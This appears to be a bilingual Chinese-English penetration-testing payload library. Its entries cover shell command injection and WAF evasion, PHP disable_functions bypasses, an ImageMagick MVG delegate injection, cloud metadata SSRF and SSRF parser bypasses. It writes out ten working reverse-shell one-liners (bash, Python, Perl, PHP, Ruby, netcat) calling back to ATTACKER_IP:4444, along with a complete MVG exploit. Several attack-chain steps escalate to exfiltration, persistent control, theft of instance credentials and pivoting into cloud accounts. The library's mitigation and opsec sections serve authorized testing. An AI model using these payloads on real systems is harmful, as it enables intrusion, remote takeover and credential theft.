description.zh: 覆盖命令连接符、命令替换、IFS 和大括号扩展形成的完整命令注入表达式。
description.en: Covers command connectors, command substitution, IFS, and brace expansion in complete command-injection expressions.

subCategory.zh: 分隔符与编码执行变体

overview.zh: Shell 分隔、替换与大括号扩展注入针对输入进入 Shell 后经历词法、参数、命令和大括号多个展开阶段的场景：单一分隔符黑名单无法覆盖全部等价语法。验证带命令体的完整注入表达式。
overview.en: Shell separator, substitution, and brace-expansion injection targets inputs passing lexical, parameter, command, and brace expansion stages inside the shell: a single-separator blacklist cannot cover all equivalent syntax. It validates complete injection expressions with command bodies.

vulnerability.zh: 输入进入 Shell 后会经历词法、参数、命令和大括号展开，单一分隔符黑名单无法覆盖全部等价语法；结论必须落到实际执行结果而非字符串形态。
vulnerability.en: Input entering a shell passes lexical, parameter, command, and brace expansion stages—a single-separator blacklist cannot cover all equivalent syntax; conclusions must rest on actual execution results, not string form.

exploitation.zh: 按第 1 步逐条提交 ;cat /etc/passwd、|cat、||cat、&cat 等带命令体的完整表达式，每个机制单独提交而不是整块粘贴；命中判据为分隔符生效后响应包含 uid= 输出或 /etc/passwd 内容。随后按同一方式扩展命令替换、IFS 与大括号扩展机制并逐条记录；确认可控后保持无害命令取证。
exploitation.en: Per step 1, submit complete expressions with command bodies—;cat /etc/passwd, |cat, ||cat, &cat—submitting each mechanism individually rather than pasting blocks; a hit is uid= output or /etc/passwd content in the response once a separator takes effect. Then extend to command substitution, IFS, and brace-expansion mechanisms the same way, recording each; after confirming control, keep commands harmless for evidence.

mitigation.zh: 移除动态 Shell 字符串，使用固定可执行文件和参数数组；对业务动作建立显式映射，并限制子进程权限和出站网络。修复后用同一正常、阳性和阴性样例回归，确认合法功能保留且各展开阶段不再改变命令结构。
mitigation.en: Remove dynamic shell strings and use fixed executables with argument arrays; build explicit maps for business actions and restrict child-process permissions and egress. After the fix, regress with the same normal, positive, and negative samples, confirming legitimate features persist and no expansion stage changes command structure.

description.zh: 找到进入 shell 执行的用户参数位置并摸清响应形态。命中判据：参数值会直接影响命令结果，为后续深入利用打下基础。
description.en: Find the user parameter reaching shell execution. Success: its value alters command results.

description.zh: 以完整表达式提交分隔符加 cat 命令体执行读取。命中判据：返回 passwd 文件的内容，并且重复提交时可以稳定复现该结果。
description.en: Submit full expressions pairing separators with a cat body. Success: passwd content returns.

description.zh: 用第 2 步入口换 $()、反引号与大括号展开形式执行。命中判据：变形后仍返回命令输出，多次提交均能得到相同结果。
description.en: Reuse the step 2 entry with $(), backticks and brace forms. Success: they still return output.

description.zh: 把读取升级为反弹或外带命令，建立持久控制通道。命中判据：接收端收到数据或回连，并且该效果可以稳定重复取得。
description.en: Escalate reads into reverse or exfil commands. Success: the collector gets data or a callback.

review.rationale: 完整表达式仍是命令注入载荷，不应迁到 Linux 命令工具卡。

description.zh: 绕过对“分隔符+空格+命令”结构的规则：$IFS 代替空格保持 token 完整；成功判据：passwd 内容回显。
description.en: Evades rules matching separator+space+command by replacing spaces with $IFS. Success: passwd contents reflected.

description.zh: 换行后用 %09 tab 分隔，配合引号拆分规避多特征组合检测；成功判据：文件内容回显。
description.en: Uses a %09 tab after newline plus quote-splitting to evade composite signatures. Success: file contents reflected.

description.zh: 换行接八进制还原的命令，绕过分隔符与命令名双重检测；成功判据：id 输出回显。
description.en: Newline followed by an octal-restored command, defeating both separator and command-name detection. Success: id output reflected.

description.zh: 绕过对 ;、|、& 等分隔符特征的拦截：用反引号命令替换直接嵌套执行；成功判据：响应中出现 root:x:0:0 回显。
description.en: Bypasses WAF rules matching separator characters like ;, | and &: embeds the command via backtick substitution. Success: response echoes root:x:0:0.

description.zh: 绕过基于分隔符与反引号的规则：使用 POSIX 命令替换语法；成功判据：文件内容回显或与 `id` 输出对比可辨识。
description.en: Evades rules keying on separators or backticks by using POSIX command substitution. Success: file contents appear in the response.

description.zh: 绕过仅匹配 %0d%0a 或明文分隔符的 WAF：单独使用 %0A 换行后接 URL 编码命令；成功判据：服务端执行换行后的命令并回显。
description.en: Bypasses WAFs matching only %0d%0a or plaintext separators: uses a lone %0A newline followed by a URL-encoded command. Success: server executes the line after the newline.

title.en: Validation step 1 for Shell Command-Separator Boundary

description.zh: 基础命令分隔包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Shell Command-Separator Boundary validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

prerequisites.zh: 已确认 10 行均为获得执行权限后直接运行的完整回连 CLI，不含请求参数闭合或漏洞触发语法。
prerequisites.en: Confirm that all ten lines are complete callback CLI commands run after execution is obtained and contain no request closure or vulnerability-trigger syntax.

prerequisites.zh: 六个目标工具卡存在，且按 Bash、Python、Perl、PHP、Ruby、Netcat 的逐行索引路由已校验。
prerequisites.en: The six destination tool cards exist and line-index routing for Bash, Python, Perl, PHP, Ruby, and Netcat has been validated.

analysis.zh: 迁移阳性证据是每行具有独立解释器/可执行文件和 ATTACKER_IP/4444 运行参数，属于操作命令而非入口 Payload。回连成功只证明已有代码执行与出站网络，不能反向证明命令注入来源；这也是迁 Tool 的边界。
analysis.en: Migration evidence is that every line names an independent interpreter or executable with ATTACKER_IP and port 4444 runtime parameters, making it an operational command rather than an entry payload. A callback proves existing execution and egress, not the source of command injection, which defines the tool boundary.

opsecTips.zh: 内容迁移阶段不建立真实回连；若必须做工具冒烟，只允许隔离回环监听，连接一次即停止。
opsecTips.en: Do not establish a real callback during migration; if a tool smoke test is required, permit only an isolated loopback listener and stop after one connection.

opsecTips.zh: 关闭监听器，删除 `/tmp/f` FIFO 和任何临时脚本，清理工具卡重复行并移除原 Payload 导航。
opsecTips.en: Close listeners, delete `/tmp/f` FIFO and temporary scripts, deduplicate tool-card lines, and remove the source payload navigation entry.

name.zh: 多语言反向 Shell 命令参考

description.zh: 汇总 Bash、Python、Perl、PHP、Ruby 与 Netcat 的独立反向连接命令，属于工具命令参考而非注入入口载荷。
description.en: Catalogs standalone reverse-connection commands for Bash, Python, Perl, PHP, Ruby, and Netcat and is a tool reference rather than injection-boundary input.

subCategory.zh: 反向 Shell 命令目录

overview.zh: 多语言反向 Shell 命令参考用于10 行都是获得执行能力之后运行的完整 CLI，缺少参数闭合、请求位置或解释器逃逸条件，不能作为独立 RCE 证明。 审校时先确认执行主体、解析器、平台和授权测试对象，并保留未修改请求或命令作为正常基线。
overview.en: Multi-Language Reverse-Shell Command Reference is intended for this boundary: All ten lines are complete commands run after execution capability exists and lack parameter closure, request position, or interpreter-escape conditions. Confirm the execution principal, parser, platform, and authorized test object, and retain an unmodified baseline.

vulnerability.zh: 原记录把后利用回连命令与发现命令注入的 Payload 混淆；回连成功只证明已有执行与出站网络，不定位漏洞入口。 结论必须落到实际信任边界，不能把字符串外观、工具输出或中间层状态变化直接当成漏洞。
vulnerability.en: The source confuses post-exploitation callback commands with payloads that discover command injection; a callback proves existing execution and egress, not the vulnerable entry point. The conclusion must identify the real trust boundary rather than treating string appearance, tool output, or intermediary status changes as a vulnerability.

exploitation.zh: 按语言和 Netcat 行索引迁入现有反弹 Shell 工具卡，保留占位符、平台条件和监听端前置要求。 工具验证需记录目标解释器、出站连接和父进程；命令注入结论仍由独立无害标记探针与请求关联提供。 全程关联原始输入、规范化结果、进程或网络日志和最终业务影响，形成可重复的阳性与阴性证据。
exploitation.en: Route line indexes by language and Netcat into existing reverse-shell tool cards while retaining placeholders, platform constraints, and listener prerequisites. Tool validation records the interpreter, outbound connection, and parent process, while command-injection proof still comes from a separate harmless marker correlated to a request. Correlate raw input, canonicalized values, process or network logs, and final business impact to build repeatable positive and negative evidence.

mitigation.zh: 迁移后 Payload 库只保留入口级 Shell 语法；工具卡明确允许的回连地址、监听端、审计与清理步骤。 修复后用同一正常、阳性和阴性样例回归，确认合法功能保留，原先跨越解释器、文件或网络边界的差异消失。
mitigation.en: After migration, keep only entry-level shell syntax in the payload library and document allowed callback destinations, listeners, auditing, and cleanup in tool cards. After remediation, replay the same normal, positive, and negative cases to preserve valid behavior and remove the former interpreter, file, or network-boundary difference.

title.zh: 确认反向 Shell 命令目录适用边界
title.en: Confirm the Reverse-Shell Command Catalog boundary

description.zh: 10 行都是获得执行能力之后运行的完整 CLI，缺少参数闭合、请求位置或解释器逃逸条件，不能作为独立 RCE 证明。 记录正常输入、执行主体、组件版本和相关进程、文件或网络日志基线。
description.en: All ten lines are complete commands run after execution capability exists and lack parameter closure, request position, or interpreter-escape conditions. Record normal input, the execution principal, component version, and relevant process, file, or network-log baseline.

title.zh: 提交受控反向 Shell 命令目录样例
title.en: Submit a controlled Reverse-Shell Command Catalog case

description.zh: 按语言和 Netcat 行索引迁入现有反弹 Shell 工具卡，保留占位符、平台条件和监听端前置要求。 一次只验证一种机制，并以唯一无害标记替代真实敏感读取、系统修改或无边界扫描。
description.en: Route line indexes by language and Netcat into existing reverse-shell tool cards while retaining placeholders, platform constraints, and listener prerequisites. Validate one mechanism at a time and use a unique harmless marker instead of sensitive reads, system changes, or unbounded scanning.

attackChain.payload:
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
nc -e /bin/sh ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444;sh <&196 >&196 2>&196

title.zh: 核对反向 Shell 命令目录证据

description.zh: 工具验证需记录目标解释器、出站连接和父进程；命令注入结论仍由独立无害标记探针与请求关联提供。 对齐各层时间戳并排除输入回显、缓存、统一错误、网络抖动和测试工具自身行为。
description.en: Tool validation records the interpreter, outbound connection, and parent process, while command-injection proof still comes from a separate harmless marker correlated to a request. Align timestamps across layers and exclude reflection, caching, generic errors, network jitter, and behavior caused by the test tool itself.

title.zh: 修复并回归反向 Shell 命令目录
title.en: Remediate and regress Reverse-Shell Command Catalog

description.zh: 迁移后 Payload 库只保留入口级 Shell 语法；工具卡明确允许的回连地址、监听端、审计与清理步骤。 重放相同三组基线，合法路径应保持可用，异常输入不得再改变执行、文件访问或最终连接目标。
description.en: After migration, keep only entry-level shell syntax in the payload library and document allowed callback destinations, listeners, auditing, and cleanup in tool cards. Replay the same three baselines; valid paths should remain functional and anomalous input must no longer alter execution, file access, or final destinations.

review.rationale: 这是按语言组织的完整反弹 Shell CLI 目录，应迁往现有工具命令。

prerequisites.zh: 已分别确认 Linux FFI、Windows COM 和环境变量/Shellshock 三条路径的平台、扩展与下游组件版本。
prerequisites.en: Separately confirm platform, extension, and downstream-component versions for Linux FFI, Windows COM, and environment-variable or Shellshock paths.

prerequisites.zh: 在隔离 PHP 实例中使用只写固定标记的函数，并可观察扩展调用、子进程与环境传播日志。
prerequisites.en: Use marker-only functions in an isolated PHP instance and observe extension calls, child processes, and environment propagation.

analysis.zh: FFI 阳性需出现实际 native 调用，COM 阳性需出现 WScript.Shell 派生进程，环境路径需由脆弱下游组件解释函数文本。仅 FFI/COM 类存在、putenv 成功、或 PHP 解析代码都不是执行绕过。
analysis.en: FFI requires an actual native call, COM requires a child process from WScript.Shell, and the environment path requires a vulnerable downstream component to interpret the function text. Class availability, successful putenv, or PHP parsing alone are not execution bypasses.

opsecTips.zh: 任一机制首次生成无害标记后停止，不执行 `cat /etc/passwd`、whoami 或跨平台替代路径。
opsecTips.en: Stop after the first harmless marker from any mechanism and do not execute `cat /etc/passwd`, whoami, or cross-platform alternatives.

opsecTips.zh: 关闭测试 FFI/COM 配置，清理环境变量、子进程和标记文件，并重启隔离 PHP worker 还原状态。
opsecTips.en: Disable test FFI or COM settings, clear environment variables, child processes, and marker files, and restart the isolated PHP worker to restore state.

name.zh: PHP disable_functions 绕过

description.zh: 覆盖 FFI、Windows COM 和环境变量/Shellshock 风格路径，验证 PHP 函数禁用是否仍存在外部执行通道。
description.en: Covers FFI, Windows COM, and environment-variable or Shellshock-style paths to test whether external execution remains despite disabled PHP functions.

subCategory.zh: 代码执行与函数滥用

overview.zh: PHP disable_functions 执行边界绕过针对函数黑名单仍存在外部执行通道的场景：FFI、Windows COM 与环境变量是三条独立机制。验证 FFI::cdef 调用 libc 与 COM 启动进程两条可用路径。
overview.en: PHP disable_functions execution-boundary bypass targets external execution channels persisting beyond function blacklists: FFI, Windows COM, and environment variables are three independent mechanisms. It validates the FFI::cdef libc path and the COM process-launch path.

vulnerability.zh: disable_functions 只限制 PHP 函数名，若 FFI 可调用 libc、COM 可启动进程或环境变量进入脆弱程序，仍能跨越执行边界；三条机制各自依赖扩展、平台和下游程序前置条件。
vulnerability.en: disable_functions restricts only PHP function names; if FFI can call libc, COM can launch processes, or environment variables reach fragile programs, the execution boundary is still crossed—the three mechanisms each depend on extensions, platform, and downstream preconditions.

exploitation.zh: 按第 1 步先确认 FFI 扩展已启用，再提交 FFI::cdef 声明与 $ffi->system 调用验证 libc 路径；Windows 目标测 COM 的 WScript.Shell 与 Run；命中判据为对应输出出现在响应或日志。环境变量路径需先确认下游程序版本；三条机制逐条验证并记录前提。
exploitation.en: Per step 1, confirm FFI is enabled first, then submit the FFI::cdef declaration with $ffi->system to validate the libc path; on Windows targets test COM's WScript.Shell with Run; a hit is corresponding output in the response or logs. The environment-variable path needs downstream program versions confirmed first; validate the three mechanisms separately, recording preconditions.

mitigation.zh: 关闭生产 FFI 和不需要的 COM，升级 Shellshock 相关组件，以容器/低权限隔离 PHP，并用系统级执行控制替代函数黑名单。修复后用同一正常、阳性和阴性样例回归，确认合法功能保留且三条通道均不可达。
mitigation.en: Disable FFI in production and unneeded COM, upgrade Shellshock-affected components, isolate PHP in containers or low privilege, and replace function blacklists with system-level execution control. After the fix, regress with the same normal, positive, and negative samples, confirming legitimate features persist and all three channels are unreachable.

description.zh: 通过 phpinfo 页面或执行报错确认 disable_functions 范围。命中判据：禁用清单完整明确。
description.en: Read disable_functions from phpinfo or error output. Success: the list is fully known.

title.zh: FFI 与 COM 路径执行

description.zh: 用 FFI cdef 调 system 执行命令，Windows 用 WScript.Shell 起进程。命中判据：返回命令输出。
description.en: Call system via FFI::cdef, or spawn processes via COM on Windows. Success: command output returns.

description.zh: 换 putenv 与环境变量传递路径穿透执行限制。命中判据：变体路径成功执行系统命令，为下一步利用保留完整的输出内容。
description.en: Try the putenv/environment route past the restriction. Success: the variant path executes.

description.zh: 以可用的执行路径封装稳定接口，维持对目标的长期控制。命中判据：可以按需执行任意命令，同时排除缓存或随机因素干扰。
description.en: Wrap the working path into a durable endpoint. Success: arbitrary commands run on demand.

review.rationale: 这些是跨越 PHP 执行限制的具体代码载荷，不是 PHP CLI 手册。

prerequisites.zh: 目标使用受测版本 ImageMagick 解析完整四行 MVG 文档，并已导出当前 security-policy。
prerequisites.en: The target parses the complete four-line MVG document with the tested ImageMagick version and the current security policy has been exported.

prerequisites.zh: 在无网络低权限沙箱中把 `ls -la` 替换为只创建唯一临时标记的动作，并保留普通图片对照。
prerequisites.en: In a networkless low-privilege sandbox, replace `ls -la` with an action that only creates a unique temporary marker and retain a normal-image control.

analysis.zh: 阳性必须由 ImageMagick 委托进程派生标记动作，并与该 MVG 上传关联。MVG 解析错误、远程图片请求、转换失败或 URL 文字出现在日志中都不等于命令执行。
analysis.en: Positive evidence requires an ImageMagick delegate process to spawn the marker action correlated to the MVG upload. MVG parse errors, remote image requests, conversion failure, or URL text in logs do not equal command execution.

opsecTips.zh: 标记动作首次被委托进程触发后停止，不执行目录枚举、下载器或持久文件写入。
opsecTips.en: Stop after the delegate first triggers the marker action and do not perform directory enumeration, downloads, or persistent file writes.

opsecTips.zh: 删除上传 MVG、转换输出和临时标记，终止委托子进程并恢复/核对 security-policy。
opsecTips.en: Delete the uploaded MVG, conversion output, and marker, terminate delegate children, and restore and verify the security policy.

name.zh: ImageMagick MVG 委托命令注入

description.zh: 使用 MVG fill URL 中的引号与管道打断委托参数，验证图像处理链是否把内容交给 Shell。
description.en: Uses quotes and a pipe inside an MVG fill URL to break delegate arguments and test whether the image-processing chain invokes a shell.

subCategory.zh: 组件与服务 RCE

overview.zh: ImageMagick MVG 委托命令注入针对图像处理链把内容交给 Shell 的场景：MVG fill URL 中的引号与管道可打断委托参数。验证四行 MVG 文档整体作为单个图像解析输入的执行行为。
overview.en: ImageMagick MVG delegate command injection targets image-processing chains handing content to the shell: quotes and pipes in MVG fill URLs can break delegate arguments. It validates the four-line MVG document processed as a single image-parsing input.

vulnerability.zh: 旧版或不安全 ImageMagick 委托把 MVG URL 拼入 Shell 命令，策略未禁用危险 coder/协议时可从图像内容跨入命令执行；MVG 文档必须整体作为单个解析输入而不是四条独立命令。
vulnerability.en: Outdated or insecure ImageMagick delegates splice MVG URLs into shell commands, and without policies disabling dangerous coders/protocols, image content crosses into command execution; the MVG document must be processed as a single parsing input, not four independent commands.

exploitation.zh: 把第 1 步的四行（push graphic-context 到 pop graphic-context）保存为 MVG 文件整体提交给目标图像处理入口，{ATTACKER_HOST} 占位符在全局变量菜单替换；命中判据为图片处理时委托执行注入命令，ls -la 输出进入响应或错误日志。先以无害命令确认委托链路，再执行标记命令取证；确认命中后评估是否可升级为反弹或文件读取，均在授权范围内。
exploitation.en: Save the step-1 four lines (push graphic-context through pop graphic-context) as an MVG file and submit the whole to the target image-processing entry, replacing the {ATTACKER_HOST} placeholder in the global variables menu; a hit is the delegate executing the injected command during processing with ls -la output entering the response or error log. First confirm the delegate chain with a harmless command, then run marker commands for evidence; after a hit, assess escalation to reverse shells or file reads within authorization.

mitigation.zh: 升级 ImageMagick，使用严格 security-policy 禁用 MVG、URL 和不需要的委托，在低权限无网络沙箱处理上传文件。修复后重放第 1 步 MVG 文档与正常图片对照，确认委托不再执行注入命令且正常图像处理可用。
mitigation.en: Upgrade ImageMagick, use a strict security-policy disabling MVG, URL, and unneeded delegates, and process uploads in low-privilege no-network sandboxes. After the fix, replay the step-1 MVG document against a normal-image control and confirm delegates no longer execute injected commands while normal image processing works.

description.zh: 找到上传后触发 ImageMagick 处理的转换或压缩功能入口。命中判据：上传的图片被服务端实际处理。
description.en: Find a feature that pushes uploads through ImageMagick. Success: uploads get processed server-side.

title.zh: 上传 MVG 投毒图片

description.zh: 以 fill url 内嵌管道命令的完整 MVG 文档提交处理。命中判据：ls 输出进入响应或错误日志。
description.en: Submit the full MVG with a piped command inside fill url. Success: ls output hits responses or logs.

attackChain.payload:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://{ATTACKER_HOST}/image.jpg"|ls "-la)'
pop graphic-context

description.zh: 观察图片处理流程中委托程序执行注入命令的痕迹。命中判据：命令执行的迹象可以被观测到，整个过程可随时重复执行。
description.en: Watch for the delegate running the injected command. Success: execution traces are observable.

title.en: Swap in a callback for control

description.zh: 把注入命令换成下载或反弹载荷建立据点。命中判据：监听端收到目标的回连请求，并且输出内容完整可供利用。
description.en: Replace the command with a fetch or reverse payload. Success: the listener receives a callback.

review.rationale: 四行是一个明确组件解析器 Payload，应保留并修正组件名称。

description.zh: 绕过对 MVG push graphic-context 特征的拦截：改用 MSL(XML) 形态直接写 WebShell 文件；成功判据：目标目录生成 shell.php。
description.en: Evades MVG push graphic-context signatures by using the MSL (XML) form to write a shell file directly. Success: shell.php appears in the target directory.

description.zh: 用 image over 原语加 ephemeral: 协议触发委托命令，绕过 fill url() 检测；成功判据：处理报错或日志含命令执行痕迹。
description.en: Uses the image over primitive with ephemeral: to trigger the delegate, evading fill url() detection. Success: errors or logs show command execution traces.

description.zh: 以 SVG 上传为载体并用 XML 实体编码 | 与空格，规避 MVG 关键词与明文管道符检测；成功判据：SVG 被处理时触发外联或命令执行。
description.en: Uses an SVG upload carrier with XML entity-encoded pipe and space to evade MVG keyword and plaintext pipe detection. Success: outbound fetch or command execution occurs when the SVG is processed.

prerequisites.zh: 已根据资产配置确认实际云平台与隔离测试实例，禁止跨 AWS、GCP、Azure、腾讯云批量尝试。
prerequisites.en: Confirm the actual cloud platform and isolated test instance from the asset inventory; do not batch-test AWS, GCP, Azure, and Tencent Cloud.

prerequisites.zh: 选择仅返回实例 ID 等非敏感字段的路径，配置平台要求的令牌/请求头，并启用出站与元数据访问日志。
prerequisites.en: Choose a path returning only a nonsensitive field such as instance ID, configure required tokens or headers, and enable egress and metadata-access logging.

analysis.zh: 阳性是应用服务器携带正确平台前置条件访问元数据端点并返回固定非敏感字段。公网模拟页面、DNS 解析到 metadata 主机、401/403、或仅观察链路本地连接失败均是假阳性；不得以获取凭据作为验证标准。
analysis.en: Positive evidence is the application server reaching the metadata endpoint with platform prerequisites and returning a fixed nonsensitive field. Public simulations, metadata hostname resolution, 401 or 403, and failed link-local connections are false positives; credential retrieval is not a validation criterion.

opsecTips.zh: 收到一个非敏感实例字段后立即停止，不访问 IAM 凭据、user-data、OAuth token 或 Kubernetes 配置。
opsecTips.en: Stop immediately after receiving one nonsensitive instance field and do not access IAM credentials, user data, OAuth tokens, or Kubernetes configuration.

opsecTips.zh: 清理请求日志中的实例标识，撤销临时测试角色/令牌，确认没有缓存元数据响应或自动重试。
opsecTips.en: Redact instance identifiers from request logs, revoke temporary test roles or tokens, and verify no metadata response cache or automatic retry remains.

name.zh: 多云实例元数据 SSRF 探测

description.zh: 覆盖 AWS、Google Cloud、Azure 与腾讯云元数据路径，验证服务端请求是否能到达链路本地凭据和实例信息端点。
description.en: Covers AWS, Google Cloud, Azure, and Tencent Cloud metadata paths to test whether server-side requests reach link-local credential and instance-information endpoints.

subCategory.zh: 云元数据获取

overview.zh: 多云实例元数据 SSRF 探测覆盖云元数据访问场景：针对服务端 URL 获取功能，验证请求能否到达 AWS、GCP、Azure 与腾讯云的链路本地元数据端点。验证维度涵盖各平台必需主机名、路径、请求头与版本参数的逐平台验证及凭据正文的排除处理。
overview.en: Multi-Cloud Instance-Metadata SSRF Probes covers cloud metadata access: for server-side URL fetching, verify whether requests reach the link-local metadata endpoints of AWS, GCP, Azure, and Tencent Cloud. Verification dimensions validate each platform's required hostname, path, headers, and version parameters per platform, excluding credential bodies.

vulnerability.zh: 根因是应用可访问用户指定 URL 且出站网络允许链路本地元数据服务，未强制 IMDSv2、Metadata-Flavor 等平台防护时实例身份与角色信息即可被读取；各平台要求不同，必须先确认实际云环境再选择对应样例。
vulnerability.en: The root cause is the application fetching user-specified URLs while egress networking permits link-local metadata services; without platform protections such as IMDSv2 or Metadata-Flavor enforced, instance identity and role information become readable. Platform requirements differ, so confirm the actual cloud environment before selecting samples.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先确认目标所属云平台与授权范围；再在克隆或隔离云实例中只选择对应平台的无敏感路径（如 instance-id、project-id），补齐必需请求头并记录出站连接，不请求凭据正文；元数据服务日志、出站代理与固定非敏感字段共同证明访问成立。不要把多平台 URL 批量发送。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first identifies the target's cloud platform and authorization scope; then, on a cloned or isolated cloud instance, choose only the platform's non-sensitive paths (e.g., instance-id, project-id), add required headers, and record egress connections without requesting credential bodies; metadata-service logs, the egress proxy, and fixed non-sensitive fields jointly prove access. Never batch-send multi-platform URLs. Replace placeholders via the global variables menu.

mitigation.zh: 阻断链路本地出站，使用 URL 允许列表与出站代理；强制各云平台最新元数据保护（IMDSv2、Metadata-Flavor 等）并为实例配置最小角色，监控元数据路径请求。修复后用同一正常、阳性和阴性样例回归，元数据端点访问被网络层拒绝。
mitigation.en: Block link-local egress and apply URL allowlists with an outbound proxy; enforce each cloud platform's latest metadata protections (IMDSv2, Metadata-Flavor, etc.), assign minimal instance roles, and monitor metadata-path requests. After the fix, regress with the same positive, negative, and normal samples: metadata endpoint access denied at the network layer.

description.zh: 提交 http://169.254.169.254/.../ecs-instance-role/ 凭证路径；返回 AccessKeyId 等字段即实例凭证可被 SSRF 直接拖走。
description.en: Submit the ecs-instance-role credentials path on 169.254.169.254; AccessKeyId fields in the response mean instance credentials are directly stealable.

title.zh: 轮换多云端点定位环境
title.en: Rotate endpoints to fingerprint the cloud

description.zh: 依次替换为各云厂商的元数据地址与所需请求头重放；返回有效 JSON 的端点即锁定实际云平台与其防护形态。
description.en: Swap in each vendor's metadata address and required headers; whichever returns valid JSON pins the actual cloud and its defenses.

title.zh: 凭证横向进入云控制面
title.en: Pivot into the cloud control plane

description.zh: 将第 1 步 AK/SK 配入云 CLI；能列出存储桶或扮演目标角色即从实例凭证升级为云账号级控制。
description.en: Load the step-1 AK/SK into the cloud CLI; listing buckets or assuming roles upgrades instance credentials to account-level control.

review.rationale: 这些是按云平台选择的 SSRF 目标 Payload，不是云 CLI。

description.zh: 绕过对 169.254.169.254 明文黑名单：链路本地地址转 32 位整数；返回 IAM 角色信息即成功。
description.en: Convert the link-local metadata address to an integer past plaintext blacklists; returned IAM role information confirms success.

description.zh: 绕过对无尾点主机名的精确匹配：加尾点后 DNS 等价解析；带 Header 请求返回实例元数据即成功。
description.en: Append the DNS-equivalent trailing dot past exact hostname matching; a Header-bearing request returning instance metadata confirms success.

description.zh: 绕过对 AWS 标准元数据地址的单点封禁：轮换阿里云/Oracle 等备用元数据端点；任一返回实例信息即成功。
description.en: Rotate alternate cloud metadata endpoints past AWS-specific blocking; any endpoint returning instance information confirms success.

prerequisites.zh: 已锁定生产使用的 URL 校验器、框架解析器、HTTP 客户端和 DNS 解析路径，并可比较各层结果。
prerequisites.en: Identify the production URL validator, framework parser, HTTP client, and DNS path and compare their results.

prerequisites.zh: 受控外部与回环标记服务均可记录唯一令牌，且每次测试只改变一个地址表示或 URL 组件。
prerequisites.en: Controlled external and loopback marker services can log unique tokens, and each test changes only one address representation or URL component.

analysis.zh: 阳性要求校验阶段认为目标可达外部，而最终 socket 实际连接受阻地址，并由标记服务证实。字符串包含内网 IP、解析器间输出不同但未连接、DNS 查询、或重定向被拒绝都不构成 SSRF。
analysis.en: Positive evidence requires validation to approve an external target while the final socket reaches a blocked address confirmed by the marker service. An internal-looking string, parser disagreement without a connection, DNS lookup, or a rejected redirect does not constitute SSRF.

opsecTips.zh: 首个解析差异形成受控回环连接后停止，不继续测试真实内网、云元数据或第三方 rebinding 域。
opsecTips.en: Stop after the first parser differential creates a controlled loopback connection; do not continue to real internal networks, cloud metadata, or third-party rebinding domains.

opsecTips.zh: 清除 DNS、代理和 HTTP 连接缓存，关闭标记服务，并删除测试域名与唯一令牌的临时记录。
opsecTips.en: Clear DNS, proxy, and HTTP connection caches, shut down marker services, and delete temporary records for test domains and unique tokens.

name.zh: SSRF URL 解析与地址规范化绕过
name.en: SSRF URL Parsing and Address-Canonicalization Bypass

description.zh: 覆盖非规范 IP、IPv6、userinfo、fragment、Unicode、DNS Rebinding 与通配 DNS，验证 URL 检查和连接目标是否一致。
description.en: Covers non-canonical IPs, IPv6, userinfo, fragments, Unicode, DNS rebinding, and wildcard DNS to test whether URL validation matches the connected destination.

subCategory.zh: URL 解析器差异

overview.zh: SSRF URL 解析与地址规范化绕过覆盖解析器差异场景：针对带 URL 检查的取回功能，验证非规范 IP、IPv6、userinfo、fragment、Unicode、DNS Rebinding 与通配 DNS 各维度下检查结论与连接目标是否一致。验证维度为单变量轮替的逐条提交。
overview.en: SSRF URL Parsing and Address-Canonicalization Bypass covers parser divergence: for fetch functions with URL checks, verify whether validation conclusions match connection targets across non-canonical IPs, IPv6, userinfo, fragments, Unicode, DNS rebinding, and wildcard DNS. Verification dimensions rotate one variable at a time, item by item.

vulnerability.zh: 根因是安全校验器、框架 URL 类和 HTTP 客户端采用不同解析与规范化规则，通过检查的主机最终连接到受阻地址；字符串包含 127、解析报错或 DNS 查询都不构成 SSRF，必须以最终 socket 目标与校验阶段的可重复差异为准。
vulnerability.en: The root cause is security validators, framework URL classes, and HTTP clients applying different parsing and canonicalization rules, so hosts passing checks connect to blocked addresses; strings containing 127, parse errors, or DNS queries are not SSRF — repeatable divergence between the final socket target and the validated value is the standard.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步先在与生产相同的解析器中离线记录每个样例的 scheme、host、port 与规范 IP；再向受控回环标记服务逐条提交单个变体并跟踪重定向与 DNS，过滤器拦截标准 127.0.0.1 而某变体仍取回回环内容且服务日志命中即确认规范化缺口。一次只改变一个维度。占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 first records each sample's scheme, host, port, and canonical IP offline in the same parser as production; then submit one variant at a time to a controlled loopback marker service while tracking redirects and DNS — the filter blocking canonical 127.0.0.1 while a variant still fetches loopback content with a service-log hit confirms the canonicalization gap. Change one dimension at a time. Replace placeholders via the global variables menu.

mitigation.zh: 由单一标准解析器完成规范化，拒绝 userinfo/fragment 混淆与非规范 IP，解析后分类所有地址，并在重定向和每次 DNS 后复检。修复后用同一正常、阳性和阴性样例回归：全部变体被拒绝，合法目标保留。
